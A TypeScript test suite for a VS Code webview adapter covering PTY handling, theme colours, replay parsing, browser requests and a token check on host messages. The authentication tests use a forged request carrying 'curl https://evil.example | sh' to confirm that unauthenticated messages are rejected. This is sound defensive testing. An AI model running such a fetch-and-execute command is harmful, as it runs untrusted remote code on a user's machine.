import { getToolDirty, resetToolDirty } from '../tool-dirty-store';
import { getToolAnnounce, resetToolAnnounces } from '../tool-announce-store';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const terminalStateStoreMocks = vi.hoisted(() => ({
  applyTerminalSemanticEvents: vi.fn(),
  removeTerminalPaneState: vi.fn(),
}));

vi.mock('../terminal-state-store', () => ({
  applyTerminalSemanticEvents: terminalStateStoreMocks.applyTerminalSemanticEvents,
  removeTerminalPaneState: terminalStateStoreMocks.removeTerminalPaneState,
}));

const terminalThemeMocks = vi.hoisted(() => ({
  getTerminalTheme: vi.fn(() => ({ foreground: '#eeeeee', background: '#111111', cursor: '#abcabc' })),
  listeners: new Set<() => void>(),
}));

vi.mock('../terminal-theme', () => ({
  getTerminalTheme: terminalThemeMocks.getTerminalTheme,
  onTerminalThemeChange: (cb: () => void) => {
    terminalThemeMocks.listeners.add(cb);
    return () => terminalThemeMocks.listeners.delete(cb);
  },
  // The replay one-shot parser answers colour queries from this, exactly as the
  // real one reads the live xterm theme.
  themeColorProvider: (target: 'foreground' | 'background' | 'cursor') =>
    terminalThemeMocks.getTerminalTheme()[target] ?? null,
}));

import {
  collectTerminalSemanticEvents,
  TerminalProtocolParser,
} from '../terminal-protocol';
import { HOST_MESSAGE_TOKEN_FIELD, HOST_MESSAGE_TOKEN_GLOBAL } from '../vscode-message-token';
import { VSCodeAdapter } from './vscode-adapter';
import { BROWSER_REQUEST_TIMEOUT_MS } from './browser-automation';

/** Stand-in for the per-boot token the extension host injects at webview boot. */
const BURROW_TOKEN = 'test-host-message-token';

/**
 * Build the `message` event the extension host would post: the payload plus the
 * token stamp `serveWebview`'s channel adds. Framed content can't read the
 * token, so a forged message is just this without the stamp.
 */
function hostMessage(data: Record<string, unknown>, token: unknown = BURROW_TOKEN): MessageEvent {
  return new MessageEvent('message', {
    data: { ...data, [HOST_MESSAGE_TOKEN_FIELD]: token },
  });
}

let windowTarget: EventTarget;
let postMessage: ReturnType<typeof vi.fn>;

/** The globals the adapter captures at construction. Shared by the suites below. */
function stubWebviewEnv(): void {
  windowTarget = new EventTarget();
  postMessage = vi.fn();
  terminalThemeMocks.listeners.clear();
  terminalThemeMocks.getTerminalTheme.mockReturnValue({ foreground: '#eeeeee', background: '#111111', cursor: '#abcabc' });
  class TestCustomEvent<T = unknown> extends Event {
    readonly detail: T;

    constructor(type: string, eventInitDict?: CustomEventInit<T>) {
      super(type, eventInitDict);
      this.detail = eventInitDict?.detail as T;
    }

    initCustomEvent(): void {}
  }
  vi.stubGlobal('window', windowTarget);
  vi.stubGlobal('CustomEvent', TestCustomEvent);
  // The adapter captures this at construction, so it must be stubbed before
  // any `new VSCodeAdapter()`.
  vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, BURROW_TOKEN);
  vi.stubGlobal('acquireVsCodeApi', () => ({
    postMessage,
    getState: vi.fn(),
    setState: vi.fn(),
  }));
}

describe('VSCodeAdapter PTY exit handling', () => {
  beforeEach(stubWebviewEnv);

  afterEach(() => {
    resetToolDirty();
    vi.unstubAllGlobals();
    vi.clearAllMocks();
  });

  it('keeps semantic pane state when a PTY exits naturally', () => {
    const adapter = new VSCodeAdapter();
    const exits: Array<{ id: string; exitCode: number }> = [];
    adapter.onPtyExit((detail) => exits.push(detail));

    windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));

    expect(exits).toEqual([{ id: 'pane-1', exitCode: 7 }]);
    expect(terminalStateStoreMocks.removeTerminalPaneState).not.toHaveBeenCalled();
  });

  it('lets lifecycle cleanup remove semantic pane state after explicitly killing a PTY', () => {
    const adapter = new VSCodeAdapter();

    adapter.killPty('pane-1');

    expect(terminalStateStoreMocks.removeTerminalPaneState).not.toHaveBeenCalled();
    expect(postMessage).toHaveBeenCalledWith({ type: 'pty:kill', id: 'pane-1' });
  });

  it('pushes resolved theme colors to the extension host on init and on theme change', () => {
    const adapter = new VSCodeAdapter();

    adapter.requestInit();
    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:themeColors',
      foreground: '#eeeeee',
      background: '#111111',
      cursor: '#abcabc',
    });

    // A VS Code theme switch fires the observer, which re-pushes current colors.
    postMessage.mockClear();
    terminalThemeMocks.getTerminalTheme.mockReturnValue({ foreground: '#000000', background: '#ffffff', cursor: '#ff0000' });
    for (const listener of terminalThemeMocks.listeners) listener();
    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:themeColors',
      foreground: '#000000',
      background: '#ffffff',
      cursor: '#ff0000',
    });
  });

  it('posts external hyperlink open requests to the extension host', () => {
    const adapter = new VSCodeAdapter();

    adapter.openExternal('https://example.com/docs');

    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:openExternal',
      uri: 'https://example.com/docs',
    });
  });

  it('posts allowlisted VS Code workbench commands to the extension host', () => {
    const adapter = new VSCodeAdapter();

    adapter.runWorkbenchCommand('workbench.action.quickOpen');

    expect(postMessage).toHaveBeenCalledWith({
      type: 'dormouse:runWorkbenchCommand',
      command: 'workbench.action.quickOpen',
    });
  });

  // The shared client's own suite covers what each verb sends; this is the
  // transport: one `alert:command` message out, the host's events back in.
  it('carries every alert verb as one alert:command and hands the host\'s events to the client', async () => {
    const adapter = new VSCodeAdapter();
    const states: unknown[] = [];
    adapter.onAlertState((detail) => void states.push(detail));

    const handle = adapter.alertAwait('pane-1', { until: 'quiet', timeoutMs: 600_000 });
    const [request] = postMessage.mock.calls[0] as [{ type: string; command: { op: string; awaitId: string } }];
    expect(request).toMatchObject({ type: 'alert:command', command: { op: 'await', id: 'pane-1', until: 'quiet' } });

    windowTarget.dispatchEvent(hostMessage({
      type: 'alert:awaitResult',
      awaitId: request.command.awaitId,
      outcome: { kind: 'resolved', cause: 'quiet', waitedMs: 12_345 },
    }));
    expect(await handle.promise).toEqual({ kind: 'resolved', cause: 'quiet', waitedMs: 12_345 });

    // Handed over without the envelope: neither the type nor the host token.
    windowTarget.dispatchEvent(hostMessage({ type: 'alert:state', id: 'pane-1', status: 'ALERT_RINGING', todo: true }));
    expect(states).toEqual([{ id: 'pane-1', status: 'ALERT_RINGING', todo: true }]);
  });

  it('receives dirty state/reset messages and retains ordered replay reports through the semantic batch', () => {
    new VSCodeAdapter();
    const id = 'dirty-vscode';
    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:toolEvents', id, events: [
      { kind: 'toolState', state: { dirty: true } },
    ] }));
    expect(getToolDirty(id)).toBe(true);
    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:toolEvents', id, events: [
      { kind: 'semantic', event: { type: 'commandStart', source: 'osc633_boundaries' } },
    ] }));
    expect(getToolDirty(id)).toBeNull();
    const before = postMessage.mock.calls.length;
    windowTarget.dispatchEvent(hostMessage({ type: 'pty:replay', id, data: '\x1b]633;C\x07\x1b]367;state;{"v":1,"dirty":false}\x07\x1b]633;D;0\x07' }));
    expect(getToolDirty(id)).toBe(false);
    expect(postMessage.mock.calls).toHaveLength(before);
    windowTarget.dispatchEvent(hostMessage({ type: 'pty:replay', id, data: 'tail without state' }));
    expect(getToolDirty(id)).toBe(false);
    windowTarget.dispatchEvent(hostMessage({ type: 'pty:replay', id, data: '\x1b]633;C\x07' }));
    expect(getToolDirty(id)).toBeNull();
  });

  it('receives owner-parsed Tool announcements and reconstructs them on replay', () => {
    resetToolAnnounces();
    const adapter = new VSCodeAdapter();
    // In stream order: a start retires the run before it, and a report later
    // in the same batch belongs to the new run.
    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:toolEvents', id: 'tool-1', events: [
      { kind: 'toolAnnounce', announce: { port: 6005, name: null, key: null, dehydrate: false, persist: null } },
      { kind: 'semantic', event: { type: 'commandStart', source: 'osc633_boundaries' } },
      { kind: 'toolAnnounce', announce: { port: 6006, name: null, key: null, dehydrate: false, persist: null } },
    ] }));
    expect(getToolAnnounce('tool-1')?.port).toBe(6006);
    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:toolEvents', id: 'tool-1', events: [
      { kind: 'semantic', event: { type: 'commandStart', source: 'osc633_boundaries' } },
    ] }));
    expect(getToolAnnounce('tool-1')).toBeNull();
    const repliesBeforeReplay = postMessage.mock.calls.length;
    windowTarget.dispatchEvent(hostMessage({ type: 'pty:replay', id: 'tool-1', data: '\x1b]367;serve;{"port":6007}\x1b\\' }));
    expect(getToolAnnounce('tool-1')?.port).toBe(6007);
    expect(postMessage.mock.calls).toHaveLength(repliesBeforeReplay);
    windowTarget.dispatchEvent(hostMessage({ type: 'pty:replay', id: 'tool-1', data: '\x1b]633;C\x07' }));
    expect(getToolAnnounce('tool-1')).toBeNull();
    windowTarget.dispatchEvent(hostMessage({ type: 'pty:replay', id: 'tool-1', data: '\x1b]633;C\x07\x1b]367;serve;{"port":6008}\x07' }));
    expect(getToolAnnounce('tool-1')?.port).toBe(6008);
  });

  it('parses replay buffers into semantic events and strips OSCs before forwarding', () => {
    const adapter = new VSCodeAdapter();
    const replays: Array<{ id: string; data: string }> = [];
    adapter.onPtyReplay((detail) => replays.push(detail));

    windowTarget.dispatchEvent(hostMessage({
      type: 'pty:replay',
      id: 'pane-1',
      data: 'hello\x1b]7;file://localhost/Users/me/project\x1b\\world',
    }));

    // Visible data is stripped of the OSC 7 sequence.
    expect(replays).toEqual([{ id: 'pane-1', data: 'helloworld' }]);

    // Semantic CWD event was forwarded under the PTY id.
    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledTimes(1);
    const [forwardedId, forwardedEvents] = terminalStateStoreMocks.applyTerminalSemanticEvents.mock.calls[0];
    expect(forwardedId).toBe('pane-1');
    expect(forwardedEvents).toHaveLength(1);
    expect(forwardedEvents[0]).toMatchObject({
      type: 'cwd',
      cwd: { path: '/Users/me/project', source: 'osc7' },
    });
  });

  it('consumes a buffered colour query rather than replaying it into xterm.js', () => {
    // A *declined* query is not consumed, so it survives into the replayed
    // bytes for xterm.js to answer — and answering is the owner's alone
    // (docs/specs/terminal-escapes.md).
    const adapter = new VSCodeAdapter();
    const replays: Array<{ id: string; data: string }> = [];
    adapter.onPtyReplay((detail) => replays.push(detail));

    windowTarget.dispatchEvent(hostMessage({
      type: 'pty:replay',
      id: 'pane-1',
      data: 'before\x1b]11;?\x07after',
    }));

    expect(replays).toEqual([{ id: 'pane-1', data: 'beforeafter' }]);
  });

  it('forwards extension-host semantic events to the pane state store', () => {
    const adapter = new VSCodeAdapter();
    const events = [
      { type: 'cwd' as const, cwd: { path: '/repo', pathKind: 'posix' as const, isRemote: false, source: 'osc633' as const, updatedAt: 5 } },
      { type: 'promptStart' as const },
    ];

    windowTarget.dispatchEvent(hostMessage({ type: 'terminal:semanticEvents', id: 'pane-1', events }));
    void adapter;

    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledTimes(1);
    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledWith('pane-1', events);
  });

  it('round-trips host-parsed semantic events through JSON to the webview adapter', () => {
    // Simulate the extension host: run live PTY data through the same parser
    // that message-router.ts uses, collect semantic events, then ship them
    // over the postMessage wire as terminal:semanticEvents.
    const hostParser = new TerminalProtocolParser();
    const parsed = hostParser.process(
      'before\x1b]7;file://prod-box/srv/app\x1b\\\x1b]133;A\x07after',
    );
    const hostEvents = collectTerminalSemanticEvents(parsed.events);
    expect(hostEvents).toHaveLength(2);

    // postMessage forces structured-clone-equivalent serialization. JSON
    // round-trip is a sufficient stand-in: it would drop functions or
    // non-cloneable values, so passing this also documents that the wire
    // payload contains only plain data.
    const wirePayload = JSON.parse(JSON.stringify({
      type: 'terminal:semanticEvents',
      id: 'pane-1',
      events: hostEvents,
    }));

    new VSCodeAdapter();
    windowTarget.dispatchEvent(hostMessage(wirePayload));

    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledTimes(1);
    expect(terminalStateStoreMocks.applyTerminalSemanticEvents).toHaveBeenCalledWith('pane-1', hostEvents);
  });

  it('forwards shell replacement requests from the extension host', () => {
    const requests: unknown[] = [];
    windowTarget.addEventListener('dormouse:new-terminal', (event) => {
      requests.push((event as CustomEvent).detail);
    });

    new VSCodeAdapter();
    windowTarget.dispatchEvent(hostMessage({
      type: 'dormouse:newTerminal',
      shell: '/bin/zsh',
      args: ['-l'],
      name: 'zsh',
      replaceUntouched: true,
      announce: true,
    }));

    expect(requests).toEqual([{
      shell: '/bin/zsh',
      args: ['-l'],
      name: 'zsh',
      replaceUntouched: true,
      announce: true,
    }]);
  });

  // "Arrived as a message event" is not evidence the extension host sent it.
  // See ../vscode-message-token.ts.
  describe('host message authentication', () => {
    /** What framed content can produce: the right shape, no token. */
    function forgedMessage(data: Record<string, unknown>): MessageEvent {
      return new MessageEvent('message', { data });
    }

    const controlRequest = {
      type: 'dor:controlRequest',
      requestId: 'forged-1',
      surfaceId: 'pane-1',
      method: 'surface.send',
      params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
    };

    it('ignores a control request that does not carry the host token', () => {
      const dispatched: unknown[] = [];
      windowTarget.addEventListener('dormouse:control-request', (event) => {
        dispatched.push((event as CustomEvent).detail);
      });

      new VSCodeAdapter();
      windowTarget.dispatchEvent(forgedMessage(controlRequest));

      // No control request reaches use-dor-control, so nothing becomes a PTY
      // write, and nothing is echoed back to the host.
      expect(dispatched).toEqual([]);
      expect(postMessage).not.toHaveBeenCalled();
    });

    it('processes the same control request when it carries the host token', () => {
      const dispatched: Array<{ method: string; params: unknown }> = [];
      windowTarget.addEventListener('dormouse:control-request', (event) => {
        dispatched.push((event as CustomEvent).detail);
      });

      new VSCodeAdapter();
      windowTarget.dispatchEvent(hostMessage(controlRequest));

      expect(dispatched).toHaveLength(1);
      expect(dispatched[0]).toMatchObject({
        method: 'surface.send',
        params: { surface: 'pane-1', input: 'curl https://evil.example | sh\n' },
      });
    });

    it('ignores untokened pty traffic, so framed content cannot spoof terminal state', () => {
      const adapter = new VSCodeAdapter();
      const data: unknown[] = [];
      const replays: unknown[] = [];
      const exits: unknown[] = [];
      const lists: unknown[] = [];
      adapter.onPtyData((detail) => data.push(detail));
      adapter.onPtyReplay((detail) => replays.push(detail));
      adapter.onPtyExit((detail) => exits.push(detail));
      adapter.onPtyList((detail) => lists.push(detail));

      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:data', id: 'pane-1', data: 'fake' }));
      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:replay', id: 'pane-1', data: 'fake' }));
      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 0 }));
      windowTarget.dispatchEvent(forgedMessage({ type: 'pty:list', ptys: [] }));
      windowTarget.dispatchEvent(forgedMessage({
        type: 'terminal:semanticEvents', id: 'pane-1', events: [{ type: 'promptStart' }],
      }));

      expect(data).toEqual([]);
      expect(replays).toEqual([]);
      expect(exits).toEqual([]);
      expect(lists).toEqual([]);
      expect(terminalStateStoreMocks.applyTerminalSemanticEvents).not.toHaveBeenCalled();
    });

    it('rejects a wrong token as firmly as a missing one', () => {
      const adapter = new VSCodeAdapter();
      const exits: unknown[] = [];
      adapter.onPtyExit((detail) => exits.push(detail));

      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }, 'guessed'));

      expect(exits).toEqual([]);
    });

    it('guards request/response replies too, so a forged reply cannot beat the real one', async () => {
      const adapter = new VSCodeAdapter();
      const pending = adapter.getCwd('pane-1');

      const [request] = postMessage.mock.calls[0] as [{ requestId: string }];

      // A forged reply matching type and requestId, racing ahead of the host's.
      windowTarget.dispatchEvent(forgedMessage({
        type: 'pty:cwd', id: 'pane-1', cwd: '/attacker', requestId: request.requestId,
      }));
      windowTarget.dispatchEvent(hostMessage({
        type: 'pty:cwd', id: 'pane-1', cwd: '/real/project', requestId: request.requestId,
      }));

      expect(await pending).toBe('/real/project');
    });

    it('accepts nothing when the host injected no token', () => {
      // A webview served without the global fails closed rather than open.
      vi.stubGlobal(HOST_MESSAGE_TOKEN_GLOBAL, undefined);
      const adapter = new VSCodeAdapter();
      const exits: unknown[] = [];
      adapter.onPtyExit((detail) => exits.push(detail));

      windowTarget.dispatchEvent(hostMessage({ type: 'pty:exit', id: 'pane-1', exitCode: 7 }));

      expect(exits).toEqual([]);
    });
  });
});


describe('VSCodeAdapter browser requests', () => {
  beforeEach(stubWebviewEnv);
  afterEach(() => {
    vi.useRealTimers();
    vi.unstubAllGlobals();
    vi.clearAllMocks();
  });

  it('declares both providers', () => {
    expect(new VSCodeAdapter().browserProviders).toEqual(['agent-browser', 'playwright']);
  });

  // A command queued behind a page-loading `open` answers only after the
  // CLI's 25s action timeout, and a launch the host bounds to answer inside
  // the same wait; giving up sooner makes the webview ask again.
  it('waits out a daemon command held behind a page load', async () => {
    vi.useFakeTimers();
    const adapter = new VSCodeAdapter();
    const binding = { session: 'sess' };
    for (const request of [
      () => adapter.browser({ provider: 'agent-browser', binding, op: 'launch', url: 'https://example.com/', headed: true }),
      () => adapter.browser({ provider: 'agent-browser', binding, op: 'history', dir: 'reload' }),
      () => adapter.browser({ provider: 'agent-browser', binding, op: 'edit', edit: 'copy' }),
    ]) {
      let settled: unknown;
      void request().then((result) => { settled = result; });
      await vi.advanceTimersByTimeAsync(BROWSER_REQUEST_TIMEOUT_MS - 1);
      expect(settled).toBeUndefined();
      await vi.advanceTimersByTimeAsync(1);
      expect(settled).toEqual({ ok: false, error: expect.stringMatching(/timed out/) });
    }
  });

  it('carries the typed request out and keeps everything the host answers with', async () => {
    const adapter = new VSCodeAdapter();
    const attached = adapter.browser({ provider: 'agent-browser', binding: { session: 'sess' }, op: 'attach', url: 'https://example.com/' });
    const request = postMessage.mock.calls.map(([message]) => message).find((message) => message.type === 'browser:request');
    expect(request.request).toEqual({ provider: 'agent-browser', binding: { session: 'sess' }, op: 'attach', url: 'https://example.com/' });
    windowTarget.dispatchEvent(hostMessage({
      type: 'browser:result', requestId: request.requestId, result: { ok: true, stream: 4321, relaunched: true, headed: true, nativeIdentity: 'id' },
    }));
    expect(await attached).toEqual({ ok: true, stream: 4321, relaunched: true, headed: true, nativeIdentity: 'id' });
  });
});

// The Burrow lives in the extension host, in whichever VS Code window won
// the bind (vscode-ext/src/burrow.ts). This is the webview's end of that
// bridge; the contract is lib/src/host/remote/service-protocol.ts.
//
// Only what this transport adds is covered here: which message carries what,
// and the host-token guard in front of all of it. The correlation, timeout,
// always-answer, and dispose rules are the shared client's
// (lib/src/host/remote/link-client.test.ts).
describe('VSCodeAdapter remote host link', () => {
  beforeEach(stubWebviewEnv);

  afterEach(() => {
    vi.unstubAllGlobals();
    vi.clearAllMocks();
  });

  /** Every `burrow:command` this adapter has posted, in order. */
  function sent(): Array<{ burrowRequestId: string; cmd: string; params?: unknown }> {
    return postMessage.mock.calls
      .map((call) => call[0])
      .filter((message) => message.type === 'burrow:command')
      .map((message) => message.payload);
  }

  function deliver(data: Record<string, unknown>): void {
    windowTarget.dispatchEvent(hostMessage(data));
  }

  it('posts a command and settles it from the result message', async () => {
    const adapter = new VSCodeAdapter();
    const pending = adapter.burrow.command('status');

    const payload = sent()[0]!;
    expect(payload.cmd).toBe('status');
    deliver({ type: 'burrow:result', payload: { burrowRequestId: payload.burrowRequestId, result: { enrolled: true } } });

    expect(await pending).toEqual({ enrolled: true });
  });

  it('answers an ask from the registered responder', () => {
    const adapter = new VSCodeAdapter();
    adapter.burrow.respond('surfaceOp', (params) => [
      { ptyId: 'pty-1', ...(params as Record<string, unknown>) },
    ]);

    deliver({ type: 'peer:ask', requestId: 'ask-1', op: 'surfaceOp', params: { surfaceId: 's1' } });

    expect(postMessage).toHaveBeenCalledWith({
      type: 'peer:answer',
      requestId: 'ask-1',
      results: [{ ptyId: 'pty-1', surfaceId: 's1' }],
    });
  });

  it('fans an extension-host event out by name', () => {
    const adapter = new VSCodeAdapter();
    const seen: unknown[] = [];
    adapter.burrow.on('pairing-queue', (data) => void seen.push(data));

    deliver({ type: 'burrow:event', payload: { name: 'pairing-queue', queue: [{ clientId: 'c1' }] } });
    expect(seen).toEqual([{ name: 'pairing-queue', queue: [{ clientId: 'c1' }] }]);
  });

  it('notifies without waiting for anything', () => {
    const adapter = new VSCodeAdapter();
    adapter.burrow.notify();
    expect(postMessage).toHaveBeenCalledWith({ type: 'peer:notify' });
  });

  it('rejects what is still in flight when the webview shuts down', async () => {
    // The extension host cleans up the PTYs, but nothing there will ever answer
    // a command this webview is still holding.
    const adapter = new VSCodeAdapter();
    const pending = adapter.burrow.command('status');
    adapter.shutdown();
    await expect(pending).rejects.toThrow('burrow bridge closed');
  });

  it('ignores an unauthenticated result, so framed content cannot settle a command', async () => {
    const adapter = new VSCodeAdapter();
    vi.useFakeTimers();
    try {
      const pending = adapter.burrow.command('status');
      const rejected = expect(pending).rejects.toThrow(/timed out/);
      windowTarget.dispatchEvent(
        new MessageEvent('message', {
          data: { type: 'burrow:result', payload: { burrowRequestId: sent()[0]!.burrowRequestId, result: 'forged' } },
        }),
      );
      await vi.advanceTimersByTimeAsync(20_000);
      await rejected;
    } finally {
      vi.useRealTimers();
    }
  });
});


describe('VSCodeAdapter port deadline', () => {
  beforeEach(stubWebviewEnv);
  afterEach(() => { vi.unstubAllGlobals(); vi.useRealTimers(); });
  it('allows both scans and the child hop before the host reply', async () => {
    vi.useFakeTimers();
    const adapter = new VSCodeAdapter();
    const answer = adapter.getOpenPorts('pane-1');
    const request = postMessage.mock.calls.at(-1)![0];
    await vi.advanceTimersByTimeAsync(7500);
    const ports = [{ address: '127.0.0.1', port: 5173, pid: 1 }];
    windowTarget.dispatchEvent(hostMessage({ type: 'pty:openPorts', requestId: request.requestId, ports }));
    expect(await answer).toEqual(ports);
  });
});
